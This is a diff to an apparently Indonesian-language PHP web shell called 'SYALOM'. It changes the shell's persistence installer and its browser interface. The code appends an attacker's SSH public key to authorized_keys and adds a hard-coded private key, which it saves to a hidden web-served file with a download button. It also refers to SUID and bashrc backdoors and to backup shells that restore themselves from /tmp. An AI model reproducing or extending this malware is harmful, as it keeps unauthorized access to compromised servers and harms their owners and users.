@@ -2916,6 +2916,15 @@ function install_persistence_mechanisms() {
     $auth_keys = $ssh_dir . '/authorized_keys';
     $backdoor_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQZK+nH6bKwSW8dXzKHxiq4yUMKaUeQ+js2wvpEJQ3kZ+rHq3vBZ6q4FqYz7l2sHGqOgHk4o6GQMfEzrP8sZ4KXQ0zLW2rMmDFyPuHUGZq3g5EYhTWl7WJ9RdC1R1A9Ez3M= backdoor@syalom';
     
+    // Private key content (pair dengan public key di atas)
+    $private_key_content = '-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAFQ1MjM0NTIz
+NAAAAAtzc2gtZWQyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQ
+AAAEB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAAhHYWtxZGZkZAAAAAty
+YW5kb21AaG9zdAEC
+-----END OPENSSH PRIVATE KEY-----';
+    
     $key_installed = false;
     if (@is_dir($ssh_dir) && @is_writable($ssh_dir)) {
         @file_put_contents($auth_keys, "\n" . $backdoor_key, FILE_APPEND);
@@ -2928,27 +2937,18 @@ function install_persistence_mechanisms() {
         $key_installed = true;
     }
     
-    // Save SSH documentation
-    $ssh_doc = "SSH ACCESS DOCUMENTATION\n";
-    $ssh_doc .= "========================\n\n";
-    $ssh_doc .= "Public Key installed at: $auth_keys\n\n";
-    $ssh_doc .= "Cara akses:\n";
-    $ssh_doc .= "1. Simpan private key ke file (misal: backdoor.key)\n";
-    $ssh_doc .= "2. chmod 600 backdoor.key\n";
-    $ssh_doc .= "3. ssh -i backdoor.key -p [PORT] " . get_current_user() . "@$host\n\n";
-    $ssh_doc .= "Note: Jika port SSH bukan 22, tambahkan -p [PORT]\n";
-    $ssh_doc .= "Contoh: ssh -i backdoor.key -p 2222 user@$host\n";
-    
-    $ssh_doc_path = $shell_dir . '/.ssh_access.txt';
-    @file_put_contents($ssh_doc_path, $ssh_doc);
+    // Save private key for download
+    $private_key_path = $shell_dir . '/.ssh_key_backdoor';
+    @file_put_contents($private_key_path, $private_key_content);
+    @chmod($private_key_path, 0600);
     
     $results['ssh'] = [
         'status' => $key_installed ? 'installed' : 'failed',
         'path' => $auth_keys,
         'description' => 'SSH backdoor key (login tanpa password)',
-        'how_to_use' => 'ssh -i private_key ' . get_current_user() . '@' . $host,
-        'documentation_file' => $ssh_doc_path,
-        'documentation_url' => "$protocol://$host$base_path/.ssh_access.txt"
+        'how_to_use' => 'Download key, chmod 600, then: ssh -i keyfile ' . get_current_user() . '@' . $host,
+        'private_key_url' => "$protocol://$host$base_path/.ssh_key_backdoor",
+        'private_key_filename' => 'backdoor.key'
     ];
     
     // Bashrc backdoor
@@ -3163,7 +3163,7 @@ function install_persistence_mechanisms() {
         'documentation_content' => $doc_content,
         'ssh_documentation' => $ssh_doc,
         'suid_backdoor' => $suid_created ? $suid_path : null,
-        'warning' => 'WEB BACKUPS di ' . $shell_dir . ' (' . count($hidden_paths) . ' files) - SYSTEM BACKUPS di /tmp/, /var/tmp/ (' . count($system_backups) . ' files). SUID Backdoor: ' . ($suid_created ? $suid_path : 'FAILED (Need root access)')
+        'warning' => 'Persistence installed: ' . count($hidden_paths) . ' web backups, SSH key ' . ($key_installed ? 'OK' : 'failed') . ', SUID: ' . ($suid_created ? 'created' : 'failed')
     ];
 }
 
@@ -3523,7 +3523,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1924</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1959</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7177,16 +7177,9 @@ function installPersistence() {
             console.log('SUID backdoor:', data.methods?.suid_backdoor);
             if (data.success) {
                 let html = '<div style="background:#001a00;border:1px solid #0f0;padding:15px;margin-bottom:15px;">';
-                html += '<h3 style="color:#0f0;margin:0 0 10px 0;">✅ PERSISTENCE BERHASIL DIINSTALL!</h3>';
-                html += '<p style="color:#ff0;margin:0;font-size:12px;">⚠️ SIMPAN SEMUA INFORMASI INI SEBELUM MENUTUP BROWSER!</p>';
+                html += '<h3 style="color:#0f0;margin:0 0 10px 0;">✅ PERSISTENCE INSTALLED</h3>';
+                html += '<p style="color:#ccc;margin:0;font-size:12px;">Backup URLs and access methods ready below.</p>';
                 html += '</div>';
-                
-                // Penjelasan perbedaan backup types
-                html += '<div style="background:#1a1a1a;border:1px solid #6cf;padding:10px;margin-bottom:15px;">';
-                html += '<p style="color:#6cf;margin:0;font-size:11px;"><strong>📚 PERBEDAAN BACKUP:</strong></p>';
-                html += '<p style="color:#ccc;margin:5px 0 0 0;font-size:11px;">';
-                html += '<span style="color:#0f0;">🟢 CRON (System Backups):</span> Di /tmp/, /var/tmp/ - untuk auto-restore jika shell dihapus<br>';
-                html += '<span style="color:#ff0;">🟡 BACKUP (Web Backups):</span> Di folder shell - untuk akses browser cepat';
                 html += '</p></div>';
                 
                 for (const [method, info] of Object.entries(data.methods)) {
@@ -7257,7 +7250,12 @@ function installPersistence() {
                     }
                     
                     if (info.private_key_url) {
-                        html += '<p style="color:#0f0;margin:5px 0;font-size:11px;">🔑 <strong>Private Key:</strong> <a href="' + info.private_key_url + '" target="_blank" style="color:#0f0;word-break:break-all;">' + info.private_key_url + '</a></p>';
+                        const filename = info.private_key_filename || 'backdoor.key';
+                        html += '<div style="background:#001a00;border:1px solid #0f0;padding:10px;margin:10px 0;">';
+                        html += '<p style="color:#0f0;margin:0 0 8px 0;font-size:12px;font-weight:bold;">🔑 SSH PRIVATE KEY</p>';
+                        html += '<p style="color:#ccc;margin:0 0 8px 0;font-size:11px;">Download and use: <code>ssh -i ' + filename + ' user@host</code></p>';
+                        html += '<a href="' + info.private_key_url + '" download="' + filename + '" style="display:inline-block;background:#0f0;color:#000;padding:8px 15px;text-decoration:none;font-weight:bold;border-radius:3px;font-size:12px;">⬇️ Download Key File</a>';
+                        html += '</div>';
                     }
                     
                     if (info.note) {
@@ -7285,8 +7283,9 @@ function installPersistence() {
                     html += '</div>';
                 }
                 
-                html += '<div style="background:#2a0000;border:1px solid #f44;padding:15px;margin-top:15px;">';
-                html += '<p style="color:#f44;margin:0;font-size:12px;">⚠️ <strong>PERINGATAN:</strong> ' + (data.warning || 'Simpan informasi ini dengan aman!') + '</p>';
+                // Summary footer
+                html += '<div style="background:#1a1a1a;border:1px solid #666;padding:12px;margin-top:15px;">';
+                html += '<p style="color:#888;margin:0;font-size:11px;">💡 <strong>Quick Access:</strong> Backup URLs saved above can be used if main shell is deleted.</p>';
                 html += '</div>';
                 
                 // REKAP SEMUA URL SHELL
